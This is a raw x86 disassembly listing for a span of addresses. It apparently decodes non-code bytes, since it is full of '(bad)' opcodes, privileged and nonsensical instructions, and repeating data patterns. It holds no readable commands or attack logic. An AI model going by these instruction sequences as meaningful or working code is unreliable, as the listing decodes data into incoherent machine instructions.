  418894:	jbe    0x4188fe
  418896:	mov    cl,0xae
  418898:	vpxor  ymm5,ymm4,YMMWORD PTR [edx+0x15233e7b]
  4188a0:	or     BYTE PTR [eax],cl
  4188a2:	mov    esi,cr7
  4188a5:	jo     0x41883e
  4188a7:	mov    cl,0xb3
  4188a9:	(bad)  
  4188aa:	mov    cl,0xcf
  4188ac:	popf   
  4188ad:	xchg   dl,dl
  4188af:	(bad)  
  4188b0:	shl    BYTE PTR [ebp-0x2b4b6160],cl
  4188b6:	retf   
  4188b7:	mov    eax,ds:0x15235074
  4188bc:	adc    eax,0x15151015
  4188c1:	adc    eax,0x20201015
  4188c6:	and    edi,DWORD PTR [esi]
  4188c8:	pusha  
  4188c9:	jnp    0x418883
  4188cb:	fsubr  st(3),st
  4188cd:	scas   al,BYTE PTR es:[edi]
  4188ce:	pop    ebp
  4188cf:	mov    esi,eax
  4188d1:	popf   
  4188d2:	imul   ebx,DWORD PTR [ebp-0x1c2e634d],0x517b97c1
  4188dc:	sub    al,0x23
  4188de:	and    edx,DWORD PTR [edi]
  4188e0:	sub    DWORD PTR [ebx+eiz*1],esi
  4188e3:	sub    al,0x36
  4188e5:	sub    DWORD PTR ss:[eax+edx*1],ebp
  4188e9:	and    BYTE PTR [esp+edx*2],ch
  4188ec:	outs   dx,DWORD PTR ds:[esi]
  4188ed:	mov    eax,ds:0x5b907dca
  4188f2:	pop    ebx
  4188f3:	mov    ch,0x9c
  4188f5:	pop    ebx
  4188f6:	test   DWORD PTR [ebp-0x36496095],eax
  4188fc:	mov    eax,ds:0x17295074
  418901:	adc    eax,0x10171715
  418906:	movhps QWORD PTR [ecx],xmm5
  418909:	push   eax
  41890a:	jo     0x4188a3
  41890c:	aad    0xa8
  41890e:	imul   eax,DWORD PTR [edi+ecx*8+0x5b86839e],0x9942765b
  418919:	aad    0xef
  41891b:	mov    edi,0x152c547f
  418920:	or     BYTE PTR [esi],al
  418922:	push   es
  418923:	adc    BYTE PTR [esi],dh
  418925:	fs xchg esp,eax
  418927:	scas   al,BYTE PTR es:[edi]
  418928:	mov    ah,0xa7
  41892b:	iret   
  41892c:	mov    edi,0xd0d68957
  418931:	lahf   
  418932:	mov    ch,BYTE PTR [edx-0x2d]
  418935:	aad    0xc7
  418937:	xchg   esp,eax
  418938:	outs   dx,DWORD PTR ds:[esi]
  418939:	cmp    esp,DWORD PTR [ebx]
  41893b:	adc    BYTE PTR [edi],cl
  41893d:	adc    BYTE PTR [edi],dl
  41893f:	and    edx,DWORD PTR [edi]
  418941:	pop    ss
  418942:	and    BYTE PTR [eax],ah
  418944:	and    ebp,DWORD PTR [ecx]
  418946:	ss push ecx
  418948:	je     0x4188e1
  41894a:	shl    dl,0xd6
  41894d:	test   al,0xa0
  41894f:	xchg   DWORD PTR [eax-0x4f79624f],ecx
  418955:	mov    cl,0x9d
  418957:	(bad)  
  418958:	jecxz  0x41891a
  41895a:	lea    ebx,[edi+0x34]
  41895d:	and    ebp,DWORD PTR [edx*1+0x15151720]
  418964:	adc    eax,0x2c2c2017
  418969:	sub    DWORD PTR [eax+edx*2],ebp
  41896c:	bound  edi,QWORD PTR [edi-0x39]
  41896f:	ret    
  418970:	xchg   edx,eax
  418971:	mov    ds:0x91846c9c,al
  418976:	imul   esi,DWORD PTR [esi-0x7a],0xffffff9f
  41897a:	mov    bl,0xc9
  41897c:	mov    eax,ds:0x17345074
  418981:	adc    eax,0x17171515
  418986:	push   es
  418987:	adc    eax,0x8d6f3617
  41898c:	iret   
  41898d:	mov    esi,0x9ec4939c
  418992:	jbe    0x418a0e
  418994:	imul   edx,DWORD PTR [ebx-0x2ae8d18a],0xfffffff2
  41899b:	mov    edi,0x10345f8d
  4189a0:	or     BYTE PTR [eax],cl
  4189a2:	push   es
  4189a3:	adc    BYTE PTR [eax+eiz*2],dh
  4189a6:	pop    esp
  4189a8:	mov    al,0xd0
  4189aa:	iret   
  4189ab:	(bad)
  4189ae:	jne    0x418a1c
  4189b0:	mov    dh,0x89
  4189b2:	mov    DWORD PTR [eax-0x52],ecx
  4189b5:	rol    ecx,cl
  4189b7:	xchg   esp,eax
  4189b8:	cmp    esp,DWORD PTR fs:[ebx]
  4189bb:	and    BYTE PTR [eax],dl
  4189bd:	adc    BYTE PTR [edi],dl
  4189bf:	xor    al,0x20
  4189c1:	sub    DWORD PTR [esi+esi*1],esi
  4189c4:	cmp    edx,DWORD PTR ss:[edi+0x70]
  4189c8:	pop    eax
  4189ca:	(bad)  
  4189cb:	out    0xe3,al
  4189cd:	xchg   edx,eax
  4189ce:	(bad)  
  4189cf:	mov    al,ds:0x9cb08687
  4189d4:	popf   
  4189d5:	mov    cl,0xb3
  4189d7:	and    eax,0xffffffc9
  4189da:	xchg   esp,eax
  4189db:	outs   dx,DWORD PTR ds:[esi]
  4189dc:	push   eax
  4189dd:	and    esp,DWORD PTR [eax]
  4189df:	pop    ss
  4189e0:	and    esp,DWORD PTR [eax]
  4189e2:	adc    eax,0x15172320
  4189e7:	and    BYTE PTR ds:0x54342329,dl
  4189ed:	je     0x418983
  4189ef:	rol    ebx,0x9d
  4189f2:	sahf   
  4189f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189f4:	test   BYTE PTR [eax-0x5f89894b],ah
  4189fa:	mov    cl,0xc9
  4189fc:	mov    eax,ds:0x1029547b
  418a01:	pop    ss
  418a02:	and    edx,DWORD PTR ds:0x17101710
  418a08:	adc    eax,0xcc7f6036
  418a0d:	ret    
  418a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a0f:	push   0xffffff93
  418a11:	sahf   
  418a12:	pushf  
  418a13:	dec    eax
  418a14:	jbe    0x4189b4
  418a16:	jp     0x418a81
  418a18:	adc    cl,BYTE PTR [ecx+0x608dcbd0]
  418a1e:	xor    al,0x15
  418a20:	or     BYTE PTR [eax],cl
  418a22:	movhps QWORD PTR [edi+ebx*2],xmm6
  418a26:	lea    esp,[edi-0x6c303050]
  418a2c:	mov    ecx,0x8773c3c1
  418a31:	mov    al,ds:0xcf876c86
  418a36:	ror    DWORD PTR [edi+0x17203660],0x15
  418a3d:	and    BYTE PTR [eax],ah
  418a3f:	sub    DWORD PTR [esi],esi
  418a41:	ds push ecx
  418a43:	push   edi
  418a44:	pusha  
  418a45:	outs   dx,DWORD PTR ds:[esi]
  418a46:	jnp    0x4189d7
  418a48:	stos   BYTE PTR es:[edi],al
  418a49:	mov    ebp,0xc4d0d2c7
  418a4e:	test   BYTE PTR [edi-0x5f799478],bl
  418a54:	jp     0x4189f2
  418a56:	mov    cl,0xb1
  418a58:	mov    bl,0xc9
  418a5a:	mov    eax,ds:0x17295474
  418a5f:	pop    ss
  418a60:	adc    eax,0x17101715
  418a65:	adc    BYTE PTR ds:0x17101020,dl
  418a6b:	sub    al,0x3e
  418a6d:	pop    edi
  418a6e:	jnp    0x418a11
  418a70:	ret    
  418a71:	mov    edi,0xa793b1c5
  418a76:	mov    bl,0xb2
  418a78:	ins    BYTE PTR es:[edi],dx
  418a79:	mov    DWORD PTR [ecx+ecx*8+0x295170a1],ebx
  418a80:	adc    BYTE PTR [eax],ah
  418a82:	and    BYTE PTR [eax],dl
  418a84:	adc    eax,0x20101010
  418a89:	sub    al,0x57
  418a8b:	jnp    0x418a4a
  418a8d:	retf   0x75a5
  418a90:	jns    0x418a16
  418a92:	test   DWORD PTR [edx],edi
  418a94:	inc    edx
  418a95:	jp     0x418a1b
  418a97:	jbe    0x418a1e
  418a99:	dec    ecx
  418a9a:	fmul   st,st(6)
  418a9c:	(bad)  
  418a9d:	pusha  
  418a9e:	sub    al,0x15
  418aa0:	or     BYTE PTR [esi],al
  418aa2:	movups xmm5,XMMWORD PTR [eax+eiz*2]
  418aa6:	(bad)  
  418aa7:	mov    eax,ds:0x35a0ccc4
  418aac:	xchg   ecx,eax
  418aad:	mov    ds:0x6c76c3ca,al
  418ab2:	mov    DWORD PTR [ebx+ebp*2-0x31],ebx
  418ab6:	enter  0x608d,0x2c
  418aba:	adc    eax,0x2915080f
  418abf:	xor    al,0x54
  418ac1:	outs   dx,DWORD PTR ds:[esi]
  418ac2:	je     0x418b43
  418ac4:	lea    ecx,[edi-0x41435569]
  418aca:	enter  0xd0b5,0xb0
  418ace:	mov    dl,0xb2
  418ad0:	xchg   DWORD PTR [edi-0x4e4e6388],eax
  418ad6:	pushf  
  418ad7:	popf   
  418ad8:	iret   
  418ad9:	(bad)  
  418ada:	mov    eax,ds:0x292c5074
  418adf:	and    BYTE PTR [ebx],ah
  418ae1:	and    ebp,DWORD PTR [ecx]
  418ae3:	and    BYTE PTR [edi],dl
  418ae5:	sub    DWORD PTR [ebx],esp
  418ae7:	and    BYTE PTR [edi],dl
  418ae9:	pop    ss
  418aea:	and    BYTE PTR [ecx],ch
  418aec:	xor    al,0x54
  418aee:	outs   dx,DWORD PTR ds:[esi]
  418aef:	(bad)
  418af3:	xchg   BYTE PTR [ebx-0x7c],bl
  418af6:	cwde   
  418af7:	lods   al,BYTE PTR ds:[esi]
  418af8:	scas   al,BYTE PTR es:[edi]
  418af9:	ins    BYTE PTR es:[edi],dx
  418afa:	cdq    
  418afb:	leave  
  418afc:	mov    eax,ds:0x10235174
  418b01:	pop    ss
  418b02:	adc    eax,0x10151020
  418b07:	movups xmm5,XMMWORD PTR [ecx]
  418b0a:	push   eax
  418b0b:	je     0x418ab7
  418b0d:	shr    DWORD PTR [ecx+0x6b844568],0x5c
  418b14:	and    dh,BYTE PTR [ebx+0x68]
  418b17:	pop    ebp
  418b18:	jp     0x418b77
  418b1a:	rcl    bl,1
  418b1c:	xchg   esp,eax
  418b1d:	fs xor al,0x17
  418b20:	push   es
  418b21:	(bad)  
  418b22:	movups xmm5,XMMWORD PTR [edi+ebx*2]
  418b26:	jg     0x418aef
  418b28:	retf   
  418b29:	(bad)  
  418b2a:	mov    bl,0xa0
  418b2c:	test   DWORD PTR [ecx-0x723e8c47],ebx
  418b32:	data16 cmp al,BYTE PTR [esi-0x3a]
  418b36:	mov    edi,0x17345f8d
  418b3b:	adc    BYTE PTR [eax],dl
  418b3d:	adc    eax,0xa96f3e2c
  418b42:	mov    ebp,0xbbaab8c2
  418b47:	mov    esp,0xc6c8c3c8
  418b4c:	mov    bh,0xb1
  418b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b4f:	mov    cl,BYTE PTR [edx-0x7985a179]
  418b55:	mov    cl,0xb3
  418b57:	popf   
  418b58:	pushf  
  418b59:	enter  0x7ba2,0x54
  418b5d:	sub    al,0x20
  418b5f:	adc    eax,0x20172023
  418b64:	and    esp,DWORD PTR [eax]
  418b66:	and    BYTE PTR [ecx],ch
  418b68:	adc    eax,0x34172029
  418b6d:	push   edi
  418b6e:	lea    edx,fs:[edi-0x7534343f]
  418b75:	ins    BYTE PTR es:[edi],dx
  418b76:	pop    ebx
  418b77:	jbe    0x418b17
  418b79:	xchg   BYTE PTR [eax+0x5074a1c9],bh
  418b7f:	and    edx,DWORD PTR ds:0x1515170f
  418b85:	and    BYTE PTR [eax],dl
  418b87:	adc    BYTE PTR [eax],dl
  418b89:	and    BYTE PTR [esi],bh
  418b8b:	jo     0x418b2f
  418b8d:	sar    DWORD PTR [ecx-0x614ccd8a],0x86
  418b94:	pop    edx
  418b95:	inc    edx
  418b96:	sub    BYTE PTR [edx],bh
  418b98:	push   0x97d4cb4a
  418b9d:	outs   dx,DWORD PTR ds:[esi]
  418b9e:	ss pop ss
  418ba0:	invd   
  418ba2:	movups xmm5,XMMWORD PTR [eax+eiz*2]
  418ba6:	(bad)  
  418ba7:	sar    BYTE PTR [esi-0x613a3c39],0x62
  418bae:	jge    0x418b68
  418bb0:	test   eax,0x4a9c8572
  418bb5:	mov    cl,0xbe
  418bb7:	lea    ebx,[edi+0x34]
  418bba:	adc    BYTE PTR [edi],cl
  418bbc:	adc    BYTE PTR ds:0xca8d502c,dl
  418bc2:	ret    
  418bc3:	enter  0xcccc,0xd4
  418bc7:	aam    0xce
  418bc9:	(bad)  
  418bca:	into   
  418bcb:	retf   0xb6b2
  418bce:	xchg   edi,eax
  418bcf:	mov    ds:0x7a858a87,eax
  418bd4:	test   DWORD PTR [ecx-0x4f],ebp
  418bd7:	popf   
  418bd8:	xchg   bl,al
  418bda:	mov    ds:0x293b5f7b,al
  418bdf:	and    BYTE PTR [edi],dl
  418be1:	pop    ss
  418be2:	adc    eax,0x17171020
  418be7:	and    BYTE PTR [eax],ah
  418be9:	and    esp,DWORD PTR [ebx]
  418beb:	ss push eax
  418bed:	pop    edi
  418bee:	je     0x418b7d
  418bf0:	xchg   edi,eax
  418bf1:	stos   BYTE PTR es:[edi],al
  418bf2:	mov    ebx,0x6c9fcec1
  418bf7:	lahf   
  418bf8:	xchg   DWORD PTR [edi+0x70a1c9c7],edx
  418bfe:	push   eax
  418bff:	and    edx,DWORD PTR [edi]
  418c01:	adc    eax,0x17151015
  418c06:	adc    eax,0x502c1510
  418c0b:	outs   dx,DWORD PTR ds:[esi]
  418c0c:	mov    ds:0x76a0abc1,al
  418c11:	xchg   BYTE PTR [edi+0x127668b0],bl
  418c17:	es push 0x97d4cc46
  418c1d:	fs ss pop ss
  418c20:	push   es
  418c21:	or     BYTE PTR [eax],cl
  418c23:	adc    eax,0xb88d5f2c
  418c28:	retf   0xc7cb
  418c2b:	shr    BYTE PTR [esi+eax*4-0x775275b4],0xa0
  418c33:	test   DWORD PTR [edi+ecx*8-0x43],ebp
  418c37:	lea    esp,[eax+0x34]
  418c3a:	pop    ss
  418c3b:	adc    BYTE PTR [eax],dl
  418c3d:	pop    ss
  418c3e:	sub    DWORD PTR [ecx+0x74],edx
  418c41:	(bad)  
  418c42:	loope  0x418c12
  418c44:	loop   0x418bfd
  418c46:	mov    WORD PTR [ebp+0x6e],gs
  418c49:	outs   dx,BYTE PTR ds:[esi]
  418c4a:	mov    al,ds:0x84b5afcb
  418c4f:	pop    edx
  418c50:	xchg   DWORD PTR [edx-0x79626278],ecx
  418c56:	imul   eax,DWORD PTR [esi+0x70a2bf86],0x23202c50
  418c60:	and    edx,DWORD PTR ds:0x10202c20
  418c66:	pop    ss
  418c67:	and    BYTE PTR [edi],dl
  418c69:	and    BYTE PTR [ebx],ah
  418c6b:	cmp    esp,DWORD PTR [eax-0x67]
  418c6e:	cdq    
  418c6f:	xchg   edi,eax
  418c70:	mov    ds:0xc7bcb8aa,al
  418c75:	retf   0x6b84
  418c78:	pushf  
  418c79:	ror    cl,0xc7
  418c7c:	xchg   edi,eax
  418c7d:	jo     0x418cd0
  418c7f:	and    edx,DWORD PTR ds:0x10101510
  418c85:	pop    ss
  418c86:	(bad)  
  418c87:	unpckhps xmm4,XMMWORD PTR [ebx]
  418c8a:	cmp    ebp,DWORD PTR [edi-0x5e]
  418c8d:	mov    ebp,0x5b84b0bf
  418c92:	pop    ebx
  418c93:	mov    ecx,0x4a9c5b5b
  418c98:	dec    eax
  418c99:	inc    esi
  418c9a:	retf   
  418c9b:	aam    0x97
  418c9d:	fs ss adc eax,0x10080806
  418ca4:	sub    al,0x57
  418ca6:	(bad)  
  418ca7:	(bad)  
  418ca8:	retf   0xc5cd
  418cab:	enter  0x91c9,0x10
  418caf:	dec    ecx
  418cb0:	dec    ebx
  418cb1:	shr    BYTE PTR [esi-0x463ca196],0x8d
  418cb8:	bound  esi,QWORD PTR [esi]
  418cba:	and    BYTE PTR ds:0x3b291710,dl
  418cc0:	outs   dx,DWORD PTR ds:[esi]
  418cc1:	xchg   edi,eax
  418cc2:	aad    0xdd
  418cc4:	js     0x418c65
  418cc6:	lahf   
  418cc7:	dec    eax
  418cc8:	inc    ebp
  418cc9:	pop    ebp
  418cca:	imul   eax,esp,0x5e89afc4
  418cd0:	dec    edi
  418cd1:	outs   dx,BYTE PTR ds:[esi]
  418cd2:	mov    BYTE PTR [esp+ebx*4-0x797ba764],bl
  418cd9:	les    esp,FWORD PTR [ecx+0x1529517b]
  418cdf:	adc    BYTE PTR ds:0x20171717,dl
  418ce5:	and    BYTE PTR [eax],ah
  418ce7:	and    BYTE PTR [edi],dl
  418ce9:	and    BYTE PTR [ebx],ah
  418ceb:	push   ecx
  418cec:	jo     0x418cad
  418cee:	into   
  418cef:	retf   0xc1c3
  418cf2:	mov    eax,0xc0c7b8b8
  418cf7:	popf   
  418cf8:	test   al,0xc7
  418cfa:	(bad)  
  418cfb:	leave  
  418cfc:	xchg   esp,eax
  418cfd:	jo     0x418d3d
  418cff:	and    edx,DWORD PTR [eax]
  418d01:	movups xmm0,XMMWORD PTR [esi]
  418d04:	pop    ss
  418d05:	pop    ss
  418d06:	invd   
  418d08:	adc    BYTE PTR [ecx],ch
  418d0a:	cmp    esi,DWORD PTR [eax-0x5e]
  418d0d:	sar    DWORD PTR [edi-0x4161d097],0x76
  418d14:	imul   ebx,DWORD PTR [ebx+0x76],0xcd436d6b
  418d1b:	aam    0xa1
  418d1d:	cmp    edx,DWORD PTR fs:0xf080606
  418d24:	and    edx,DWORD PTR [ecx+0x7f]
  418d27:	ret    
  418d28:	mov    edi,0xc1b4b3c0
  418d2d:	(bad)  
  418d2e:	scas   eax,DWORD PTR es:[edi]
  418d2f:	lahf   
  418d30:	dec    esp
  418d31:	dec    ecx
  418d32:	ja     0x418cd7
  418d34:	imul   eax,ebx,0xffffffc1
  418d37:	lea    edx,[edi+0x23]
  418d3a:	adc    BYTE PTR [eax],dl
  418d3c:	adc    BYTE PTR [edi],dl
  418d3e:	and    esi,DWORD PTR [esi]
  418d40:	pusha  
  418d41:	jg     0x418ced
  418d43:	(bad)  
  418d44:	mov    dl,0x43
  418d46:	ja     0x418db1
  418d48:	dec    eax
  418d49:	inc    ebp
  418d4a:	cmp    al,BYTE PTR [ebp-0x78627753]
  418d50:	outs   dx,BYTE PTR ds:[esi]
  418d51:	dec    edi
  418d52:	js     0x418ce8
  418d54:	imul   ebx,DWORD PTR [esi+esi*2-0x5e40637c],0x15365774
  418d5f:	movhps QWORD PTR [eax],xmm4
  418d62:	pop    ss
  418d63:	adc    eax,0x15201510
  418d68:	and    BYTE PTR [ecx],ch
  418d6a:	ss push edi
  418d6c:	jnp    0x418d27
  418d6e:	ret    
  418d6f:	into   
  418d70:	int    0xce
  418d72:	sar    DWORD PTR [eax-0x3e434748],0xc8
  418d79:	leave  
  418d7a:	ror    cl,0x94
  418d7d:	bound  edi,QWORD PTR [esi]
  418d7f:	sub    DWORD PTR [eax],edx
  418d81:	movhps QWORD PTR [eax],xmm2
  418d84:	adc    BYTE PTR [edi],dl
  418d86:	adc    eax,0x50231510
  418d8b:	jo     0x418d48
  418d8d:	shr    DWORD PTR [edi+eax*1-0x6d7951a7],0x86
  418d95:	pop    ebx
  418d96:	xchg   BYTE PTR [esi+0x20],dh
  418d99:	and    eax,0x6f97d4ce
  418d9e:	xor    al,0x17
  418da0:	add    DWORD PTR [eax],ecx
  418da2:	push   es
  418da3:	mov    db7,esi
  418da6:	jnp    0x418d65
  418da8:	ins    BYTE PTR es:[edi],dx
  418da9:	(bad)
  418dad:	les    ebp,FWORD PTR [ebp+0x6b4988b2]
  418db3:	inc    eax
  418db4:	push   0x5f8dc1cd
  418db9:	sub    al,0x15
  418dbb:	(bad)  
  418dbc:	unpckhps xmm2,XMMWORD PTR ds:0x8d643e20
  418dc3:	mov    ecx,0x455e89d1
  418dc8:	imul   ebx,DWORD PTR [esi+0x5d],0x47
  418dcc:	ss data16 js 0x418e3d
  418dd0:	outs   dx,BYTE PTR ds:[esi]
  418dd1:	outs   dx,BYTE PTR ds:[esi]
  418dd2:	outs   dx,BYTE PTR ds:[esi]
  418dd3:	pop    edi
  418dd4:	xchg   edi,eax
  418dd5:	popf   
  418dd6:	pop    ebx
  418dd7:	jbe    0x418d5e
  418dd9:	les    esp,FWORD PTR [ecx+0x20293e74]
  418ddf:	adc    eax,0x17171510
  418de4:	adc    eax,0x15152015
  418de9:	pop    ss
  418dea:	cmp    ebx,DWORD PTR [edi-0x73]
  418ded:	mov    esi,0xd1d1d4d3
  418df2:	aam    0xcd
  418df4:	mov    ebp,0xc0bcb8b8
  418df9:	(bad)  
  418dfa:	mov    eax,0x36577bc7
  418dff:	and    BYTE PTR ds:0x15152015,dl
  418e05:	adc    eax,0x29150f10
  418e0a:	push   eax
  418e0b:	jo     0x418db7
  418e0d:	rcr    DWORD PTR [ebp+0x56],0x81
  418e11:	pop    esi
  418e12:	pop    esp
  418e13:	jne    0x418dd7
  418e15:	jbe    0x418e44
  418e17:	pushf  
  418e18:	jbe    0x418e2c
  418e1a:	into   
  418e1b:	aam    0x97
  418e1d:	fs xor al,0x15
  418e20:	push   es
  418e21:	push   es
  418e22:	push   es
  418e23:	or     BYTE PTR [eax],ah
  418e25:	push   eax
  418e26:	je     0x418dd2
  418e28:	call   0x9eb5:0xa0b5cca6
  418e2f:	scas   eax,DWORD PTR es:[edi]
  418e30:	mov    ch,BYTE PTR [ebp-0x7b]
  418e33:	sbb    edi,DWORD PTR [edx-0x33]
  418e36:	lods   al,BYTE PTR ds:[esi]
  418e37:	lea    ebx,[edi+0x2c]
  418e3a:	adc    eax,0x17100f0f
  418e3f:	and    BYTE PTR [eax+edx*2],ch
  418e42:	fs (bad) 
  418e44:	mov    edi,0x462f9ecb
  418e49:	imul   ebp,DWORD PTR [esi+0x6d],0x46
  418e4d:	jbe    0x418df8
  418e4f:	jns    0x418dd8
  418e51:	dec    edi
  418e52:	outs   dx,BYTE PTR ds:[esi]
  418e53:	xor    al,BYTE PTR [edi+0x767677a8]
  418e59:	sahf   
  418e5a:	mov    eax,ds:0x10235174
  418e5f:	pop    ss
  418e60:	and    BYTE PTR [eax],ah
  418e62:	pop    ss
  418e63:	adc    eax,0x10171515
  418e68:	pop    ss
  418e69:	pop    ss
  418e6a:	xor    al,0x60
  418e6c:	(bad)  
  418e6d:	mov    ebp,0x2f2f8ad3
  418e72:	inc    edi
  418e73:	mov    ebp,eax
  418e75:	sar    DWORD PTR [eax-0x3d554748],0x97
  418e7c:	fs push eax
  418e7e:	sub    al,0x15
  418e80:	adc    eax,0x100f0f10
  418e85:	adc    eax,0x29151510
  418e8a:	push   ecx
  418e8b:	je     0x418e45
  418e8d:	ret    0x5a59
  418e90:	sbb    DWORD PTR [edx+0x69],ebx
  418e93:	pop    esp
  418e94:	mov    ds:0x695b5bb9,al
  418e99:	and    eax,0x6497cecc
  418e9e:	cmp    edx,DWORD PTR [edi]
  418ea0:	add    DWORD PTR [esi],eax
  418ea2:	or     BYTE PTR [eax],cl
  418ea4:	pop    ss
  418ea5:	cmp    esi,DWORD PTR [eax-0x69]
  418ea8:	mov    ds:0xb1b5a078,al
  418ead:	mov    al,ds:0x4fafaf9f
  418eb2:	ins    DWORD PTR es:[edi],dx
  418eb3:	das    
  418eb4:	jp     0x418e80
  418eb6:	stos   DWORD PTR es:[edi],eax
  418eb7:	(bad)  
  418eb8:	pusha  
  418eb9:	xor    al,0x10
  418ebb:	or     BYTE PTR [eax],cl
  418ebd:	(bad)  
  418ebe:	(bad)  
  418ebf:	movhps QWORD PTR [eax+edx*2],xmm5
  418ec3:	outs   dx,DWORD PTR ds:[esi]
  418ec4:	lea    edi,[ecx+0x4c469bc3]
  418eca:	ins    DWORD PTR es:[edi],dx
  418ecb:	pop    edx
  418ecc:	ins    DWORD PTR es:[edi],dx
  418ecd:	dec    esi
  418ece:	ja     0x418f4f
  418ed0:	xchg   ecx,eax
  418ed1:	xchg   DWORD PTR [ebp+0x42],ebp
  418ed4:	cs inc edx
  418ed6:	js     0x418f41
  418ed8:	pop    eax
  418ed9:	lods   al,BYTE PTR ds:[esi]
  418eda:	mov    eax,ds:0x17293e74
  418edf:	adc    BYTE PTR ds:0x15202017,dl
  418ee5:	adc    eax,0x15151015
  418eea:	cmp    esp,DWORD PTR [edx-0x71]
  418eed:	mov    ecx,0x5b4286d3
  418ef2:	inc    ebp
  418ef3:	pop    es
  418ef4:	sbb    DWORD PTR [esi-0x6855433d],ebx
  418efa:	xchg   edi,eax
  418efb:	jo     0x418f51
  418efd:	xor    al,0x23
  418eff:	adc    eax,0x80f0f15
  418f04:	unpckhps xmm0,XMMWORD PTR [esi]
  418f07:	adc    eax,0x7451290f
  418f0c:	mov    eax,0x765b3083
  418f11:	cmp    DWORD PTR [ecx+0x6e],ecx
  418f14:	push   cs
  418f15:	mov    eax,0xc1176cb
  418f1a:	(bad)  
  418f1b:	rcl    DWORD PTR [edi+0x615366f],cl
  418f21:	push   es
  418f22:	push   es
  418f23:	mov    ebx,cr7
  418f26:	jo     0x418ebf
  418f28:	mov    esp,0x9db08730
  418f2d:	pushf  
  418f2e:	mov    al,ds:0x8bc4c28a
  418f33:	pop    esi
  418f34:	dec    edx
  418f35:	lods   eax,DWORD PTR ds:[esi]
  418f36:	(bad)  
  418f37:	(bad)  
  418f38:	fs xor al,0x17
  418f3b:	adc    BYTE PTR [edi],cl
  418f3d:	movups xmm1,XMMWORD PTR [edi]
  418f40:	adc    eax,0x643e2c17
  418f45:	lea    ebp,[edx+0x1b49a8c3]
  418f4b:	dec    esp
  418f4c:	inc    edi
  418f4d:	inc    esi
  418f4e:	dec    ebp
  418f4f:	pop    esi
  418f50:	inc    ebx
  418f51:	das    
  418f52:	sub    DWORD PTR cs:[eax+0x49],ecx
  418f56:	imul   ebp,DWORD PTR [eax+0x41],0x3e7097c7
  418f5d:	and    BYTE PTR ds:0x8100f15,dl
  418f63:	adc    eax,0x15171017
  418f68:	adc    eax,0x946f3e29
  418f6d:	ret    0x6bcb
  418f70:	pop    edx
  418f71:	pop    ebx
  418f72:	imul   eax,DWORD PTR [ecx+ebx*1+0x5],0x97bcbc68
  418f7a:	jnp    0x418fdc
  418f7c:	cmp    ebp,DWORD PTR [edx*1+0xf0f1015]
  418f83:	adc    BYTE PTR [edi],cl
  418f85:	pop    ss
  418f86:	unpckhps xmm1,XMMWORD PTR [eax]
  418f89:	and    edx,DWORD PTR [eax+0x7b]
  418f8c:	mov    eax,0x5d693277
  418f91:	cmp    DWORD PTR [edi],esp
  418f93:	ins    DWORD PTR es:[edi],dx
  418f94:	dec    esp
  418f95:	leavew 
  418f97:	ret    0xc5e
  418f9a:	mov    cl,0xce
  418f9c:	xchg   edi,eax
  418f9d:	outs   dx,DWORD PTR ds:[esi]
  418f9e:	ss adc eax,0x8060606
  418fa4:	and    BYTE PTR [esi],bh
  418fa6:	jo     0x418f3f
  418fa8:	rol    BYTE PTR [edi-0x4f4e4e77],0xa0
  418faf:	mov    dl,0x8b
  418fb1:	mov    ds:0xad6b4daf,al
  418fb6:	rcl    BYTE PTR [edi+ebp*2+0xf0f173b],0x10
  418fbe:	invd   
  418fc0:	movups xmm2,XMMWORD PTR [edi]
  418fc3:	and    edi,DWORD PTR [esi]
  418fc5:	pusha  
  418fc6:	jg     0x418f72
  418fc8:	ret    
  418fc9:	ret    
  418fca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fcb:	xchg   ebp,eax
  418fcc:	ja     0x419045
  418fce:	ja     0x41903b
  418fd0:	test   DWORD PTR [ebx+0x2a],ebp
  418fd3:	dec    edi
  418fd4:	dec    edi
  418fd5:	dec    esi
  418fd6:	pop    esi
  418fd7:	pop    ebp
  418fd8:	mov    ds:0x3e6494c9,al
  418fdd:	sub    DWORD PTR ds:0x10081515,edx
  418fe3:	movups xmm2,XMMWORD PTR [eax]
  418fe6:	pop    ss
  418fe7:	adc    eax,0x643e290f
  418fec:	xchg   edi,eax
  418fed:	int    0xcb
  418fef:	jbe    0x419033
  418ff1:	inc    esp
  418ff2:	pop    esp
  418ff3:	inc    esp
  418ff4:	inc    esp
  418ff5:	inc    esp
  418ff6:	sbb    al,0x44
  418ff8:	mov    esp,0x34607fb8
  418ffd:	and    edx,DWORD PTR [eax]
  418fff:	adc    BYTE PTR [edi],cl
  419001:	or     BYTE PTR [edi],cl
  419003:	(bad)  
  419004:	invd   
  419006:	adc    BYTE PTR [eax],cl
  419008:	mov    db2,ecx
  41900b:	jnp    0x418fc8
  41900d:	add    DWORD PTR [esi+0x5b],0x5a
  419011:	sub    eax,0x316d4522
  419016:	mov    eax,ds:0x790ba9c9
  41901b:	int    0x94
  41901d:	outs   dx,DWORD PTR ds:[esi]
  41901e:	ss adc eax,0x10080606
  419024:	and    edx,DWORD PTR [eax-0x71]
  419027:	sar    BYTE PTR [edi+eax*4-0x634f6279],0x9d
  41902f:	xchg   ebx,eax
  419030:	outs   dx,BYTE PTR ds:[esi]
  419031:	pop    ecx
  419032:	xchg   ebp,eax
  419033:	dec    ebp
  419034:	ins    DWORD PTR es:[edi],dx
  419035:	lods   eax,DWORD PTR ds:[esi]
  419036:	rcl    BYTE PTR [edi+0xf203e70],0x8
  41903d:	push   es
  41903e:	or     BYTE PTR [eax],cl
  419040:	movups xmm2,XMMWORD PTR [eax]
  419043:	adc    eax,0x7b5f3629
  419048:	xchg   esp,eax
  419049:	mov    esp,0xc7c7c8c8
  41904e:	stos   BYTE PTR es:[edi],al
  41904f:	mov    ?,WORD PTR [eax-0x3e343d40]
  419055:	rol    edx,0xc1
  419058:	leave  
  419059:	leave  
  41905a:	jg     0x4190bb
  41905c:	sub    al,0x17
  41905e:	adc    BYTE PTR [edi],dl
  419060:	and    BYTE PTR ds:0xf151515,dl
  419066:	adc    BYTE PTR [eax],dl
  419068:	push   es
  419069:	and    BYTE PTR [esi],bh
  41906b:	mov    eax,fs:0x4485c3c8
  419071:	inc    edx
  419072:	inc    esp
  419073:	daa    
  419074:	xor    al,BYTE PTR [esp+eax*2+0x1d]
  419078:	inc    ecx
  419079:	mov    esp,0x1034578d
  41907e:	adc    eax,0xf080f0f
